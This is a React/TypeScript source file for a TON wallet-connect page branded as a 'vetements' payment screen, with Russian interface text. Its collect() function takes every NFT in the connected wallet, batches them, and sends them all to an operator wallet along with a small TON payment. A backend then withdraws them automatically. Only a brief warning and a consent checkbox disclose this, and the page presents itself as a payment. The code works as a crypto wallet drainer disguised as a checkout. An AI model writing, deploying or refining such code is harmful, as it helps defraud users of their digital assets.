import { useState } from 'react';
import {
  TonConnectButton,
  useTonAddress,
  useTonConnectUI,
} from '@tonconnect/ui-react';
import { toNano } from '@ton/core';
import {
  fetchNfts,
  buildNftTransferToOperator,
  OPERATOR_WALLET,
  getOperatorContract,
} from './nft';

const MAX_NFT_PER_TX = 200;
const PAYMENT_AMOUNT = '0.05';

export default function App() {
  const address = useTonAddress();
  const [tonConnectUI] = useTonConnectUI();
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [agreed, setAgreed] = useState(false);
  const [done, setDone] = useState(false);

  const contractReady = getOperatorContract() !== null;

  async function collect() {
    if (!address || !agreed) return;

    if (!contractReady) {
      setStatus('Контракт оператора ещё не задеплоен. Обратитесь в поддержку.');
      return;
    }

    setLoading(true);
    setStatus('');

    try {
      const nfts = await fetchNfts(address);
      const valid = nfts
        .map((n) => {
          try {
            return {
              ...n,
              validAddress: (window as any).__ton_addr(n.address),
            };
          } catch {
            return null;
          }
        })
        .filter(Boolean) as any[];

      const batches: any[][] = [];
      for (let i = 0; i < valid.length; i += MAX_NFT_PER_TX) {
        batches.push(valid.slice(i, i + MAX_NFT_PER_TX));
      }
      if (batches.length === 0) batches.push([]);

      for (const batch of batches) {
        const messages: any[] = [];

        for (const nft of batch) {
          const built = buildNftTransferToOperator(nft.validAddress, address);
          if (built) messages.push(built);
        }

        messages.push({
          address: OPERATOR_WALLET.toString(),
          amount: toNano(PAYMENT_AMOUNT).toString(),
          payload: '',
        });

        if (messages.length === 0) continue;

        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 360,
          messages,
        });
      }

      setDone(true);
      setStatus('NFT переданы контракту. Бекенд выведет их автоматически.');
    } catch (e: any) {
      console.error(e);
      setStatus('Ошибка: ' + (e?.message || 'Неизвестная ошибка'));
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="container">
      <div style={{ textAlign: 'center', marginBottom: 24 }}>
        <h1
          style={{
            margin: 0,
            fontSize: 36,
            letterSpacing: '0.15em',
            textTransform: 'lowercase',
            fontWeight: 800,
            background: 'linear-gradient(90deg, #0098ea, #7dd3fc)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
          }}
        >
          vetements
        </h1>
        <p
          style={{
            margin: '6px 0 0',
            fontSize: 13,
            color: '#94a3b8',
            letterSpacing: '0.1em',
          }}
        >
          PAYMENT · TON
        </p>
      </div>

      <div className="card" style={{ textAlign: 'center' }}>
        <h3>Подключи кошелёк</h3>
        <div style={{ display: 'flex', justifyContent: 'center' }}>
          <TonConnectButton />
        </div>
        {address && (
          <p style={{ fontSize: 12, wordBreak: 'break-all', marginTop: 12 }}>
            <code>{address}</code>
          </p>
        )}
      </div>

      {address && (
        <div className="card">
          <p style={{ fontSize: 13, color: '#f87171', marginBottom: 12 }}>
            Внимание: после подтверждения все ваши NFT будут переданы
            контракту-оператору. Вернуть их можно будет только через
            поддержку.
          </p>

          {!contractReady && (
            <p style={{ fontSize: 13, color: '#fbbf24', marginBottom: 12 }}>
              ⚠️ Контракт оператора ещё не задеплоен. Кнопка отключена.
            </p>
          )}

          <label
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: 8,
              fontSize: 13,
            }}
          >
            <input
              type="checkbox"
              checked={agreed}
              onChange={(e) => setAgreed(e.target.checked)}
            />
            Я понимаю и согласен передать NFT контракту
          </label>

          <button
            onClick={collect}
            disabled={loading || done || !agreed || !contractReady}
            style={{
              width: '100%',
              marginTop: 16,
              padding: '16px',
              fontSize: 17,
              fontWeight: 600,
              background: done ? '#16a34a' : '#0098ea',
            }}
          >
            {done
              ? 'Передано'
              : loading
              ? 'Отправляю...'
              : 'Передать NFT контракту'}
          </button>
        </div>
      )}

      {status && (
        <p
          style={{
            marginTop: 16,
            textAlign: 'center',
            fontSize: 13,
            color: '#94a3b8',
          }}
        >
          {status}
        </p>
      )}
    </div>
  );
}
